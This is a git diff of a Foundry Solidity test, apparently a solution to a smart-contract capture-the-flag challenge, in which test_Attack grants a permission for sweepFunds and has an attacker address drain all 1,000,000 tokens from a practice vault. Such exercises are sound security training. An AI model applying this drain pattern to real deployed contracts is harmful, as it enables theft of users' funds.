@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test, console2, console} from "forge-std/Test.sol";
 import {AuthorizedExecutor} from "../src/AuthorizedExecutor.sol";
 import {DamnValuableToken} from "../src/DamnValuableToken.sol";
 
@@ -12,14 +12,6 @@ contract SelfAuthorizedVaultTest is UtilsTest {
     address attackerAddress = makeAddr("attacker Address");
     function setUp() public override {
         super.setUp();
-
-        ids[0] = keccak256(
-            abi.encode(
-                bytes4(keccak256("transfer(address,uint256)")), // 4-byte selector
-                attackerAddress,
-                attacker
-            )
-        );
     }
 
     function test_vaultFunds() public {
@@ -32,13 +24,33 @@ contract SelfAuthorizedVaultTest is UtilsTest {
     function test_setPermission() public {}
 
     function test_Attack() public {
-        vault.setPermissions(ids);
-        bytes memory actionData = abi.encodeWithSignature(
-            "transfer(address,uin256)",
-            address(this),
-            1000000 ether
+        ids[0] = keccak256(
+            abi.encodePacked(
+                vault.sweepFunds.selector,
+                attackerAddress,
+                address(vault)
+            )
         );
 
-        vault.execute(address(attacker), actionData);
+        vault.setPermissions(ids);
+
+        bytes memory actionData = abi.encodeWithSelector(
+            vault.sweepFunds.selector,
+            attackerAddress,
+            token
+        );
+
+        vault.getActionId(
+            bytes4(vault.sweepFunds.selector),
+            attackerAddress,
+            address(vault)
+        );
+
+        vm.startPrank(attackerAddress);
+
+        vault.execute(address(vault), actionData);
+
+        assertEq(token.balanceOf(address(vault)), 0);
+        assertEq(token.balanceOf(attackerAddress), 1000000 ether);
     }
 }
